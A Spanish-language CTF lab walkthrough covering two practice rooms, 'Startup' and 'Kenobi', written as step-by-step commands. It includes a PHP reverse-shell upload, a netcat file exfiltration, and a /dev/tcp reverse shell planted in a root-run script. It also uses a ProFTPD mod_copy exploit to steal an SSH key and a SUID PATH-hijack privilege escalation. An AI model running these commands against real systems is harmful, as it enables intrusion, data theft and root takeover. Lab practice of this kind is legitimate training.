
## Room: Startup
### 1. Enumeración y Descubrimiento
- Escaneo con `nmap`:
``` 
nmap -sV -T5 -v 10.10.179.192 -oN nmap
```
- Conectar a `ftp` y descargar archivos
```
ftp 10.10.179.192
ls -la
prompt
mget *
bye
```
- Verificamos los archivos descargados en busca de pistas
```
cat notice.txt 
eog important.jpg
```
- Enumeramos directorios en http y encontramos `/files`
```
gobuster dir -u http://10.10.179.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60
```

- Lo navegamos y verificamos que son los mismos archivos del ftp
```
http://10.10.179.192/files
```
### 2. Explotación de Credenciales y Steganography
- Preparamos el payload, copiando el webshell y configurando la IP y el puerto
```
locate php-reverse 
cp /usr/share/webshells/php/php-reverse-shell.php shell.php

nano shell.php
$ip = '10.13.81.73';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
```
 - Subimos por ftp el web shell en la ruta `/ftp`
```
ftp 10.10.179.192
ftp> cd ftp
ftp> put shell.php
ftp> bye
```
- Establecemos un listener con netcat y visitamos `http://10.10.179.192/ftp/webshell.php` para enlazar el reverse shell
```
nc -lvnp 4444 
$ 
```
- Migramos a una terminal `tty`
```
python3 -c "import pty;pty.spawn('/bin/bash');"
www-data@startup:/$ ^Z
stty raw -echo; fg 
export TERM=xterm
```
- Estando dentro rever shell (victima), exploramos directorios y vemos la receta
```
cd /
ls -la
cat recipe.txt
```
- Intentamos obtener la bandera de `user` pero fallamos
```
cd /home
cd lennie/
```
- Encontramos archivo sospechoso y lo transferimos
```
> en remoto
cd /
ls
nc 10.13.81.73 2030 < suspicious.pcapng

> en local
nc -lnvp 2030 > suspicious.pcapng
```
- abrimos en wireshark y seguimos el stream TCP y encontramos el pass para lennie
```
wireshark suspicious.pcapng
```
- con el pass cambiamos a `lennie` y obtenemos la bandera de `user`
```
su lennie
cd /home/lennie/
ls
cat user.txt
```
### 3. Escalada de Privilegios
- Exploramos la carpeta de `/home/lennie/scripts`, `planner.sh` le pertenece a root
```
ls /home/lennie/scripts
cat planner.sh
```
- el script le pertenece a root ejecuta /`etc/print.sh`
```
cat /etc/print.sh 
```
- Plantamos un reverse shell ahi
```
nano /etc/print.sh

#!/bin/bash
echo "Done!"
exec 5<>/dev/tcp/10.13.81.73/5555;cat <&5 | while read line; do $line 2>&5 >&5;$
```
> Generador de reverse shells> https://www.revshells.com/
- Lanzamos un listenner para recibir la conexión del rever shell que viene de la vicitma
```
nc -lnvp 5555                    
listening on [any] 5555 ...
 
id
cd /root
ls
 
cat root.txt
```

 
## Room: Kenobi
### 1. Enumeración y Descubrimiento
- Escaneo de puertos
```
nmap -sV -v 10.10.207.144
```
- Enumeramos recursos compartidos por `smb` con scripts de `nmap` , `anonymous`  es el interesante
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.112.187
```
- Enumeramos recursos compartidos por `smb` con `smbclient`
```
smbclient -L 10.10.207.144
```
- Conectarnos a recurso compartido y descargar archivos con `smbclient`
```
smbclient //10.10.207.144/anonymous
dir
get log.txt
exit
```
- Conectarnos a recurso compartido y descargar archivos con `smbget`
```
smbget --recursive smb://10.10.112.187/anonymous
```
- Visualizar el archivo y detectar nombres de usuario e instrucciones para generar llave .ssh
```
head -n60 log.txt
```
- Enumeración de recursos compartidos por `rpcbind` (nfs) con `nmap` encontamos `/var`
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.249.9
```
 - Enumeración de recursos compartidos por `rpcbind` (nfs) con `showmount`
```
showmount -e 10.10.207.144
```

### 2. Explotación de servicios vulnerables

- Buscamos los exploits con `searchsploit`
```
searchsploit ProFTPD 1.3.5
```
- Ver información del exploit , funciones vulnerables de `ProFTPD` `CPFR` y `CPTO`
```
earchsploit -x 36742.txt 
```
- Explotar la vulnerabilidad para copiar  la llave privada  ssh de `kenobi`
```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```
- Montar `/var` localmente copiar la llave privada a la maquina local
```
sudo mkdir /mnt/kenobi
sudo mount 10.10.207.144:/var /mnt/kenobi
cp /mnt/kenobi/tmp/id_rsa .
sudo umount /mnt/kenobi
```
- Usar la llave privada para ingresar por `ssh` como usuario `kenobi` con el user y pass encontrados anteriormente
```
sudo chmod 600 id_rsa 
ssh -i id_rsa kenobi@10.10.207.144
```
- Buscar y obtener la bandera de usuario
```
id 
ls -la
cat user.txt
```
### 3. Escalada de Privilegios por Manipulación de PATH
- Buscar archivos con bit SUID
```
find / -perm -u=s -type f 2>/dev/null
```
- Ejecutar binario SIUD vulnerable y analizar la salida
```
/usr/bin/menu
```
- Ver las cadenas en el binario, encontramos la invocación a comandos del SO, entre ellos `curl` que suplantaremos
```
strings /usr/bin/menu
```
- Copiamos /bin/sh como curl en la carpeta temporal y modificamos la ruta
```
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
```
- Invocamos el binario `SUID` para explotar el `PATH` modificado y obtener `root`
```
cd /tmp
/usr/bin/menu 

id
cd /root
cat root.txt
```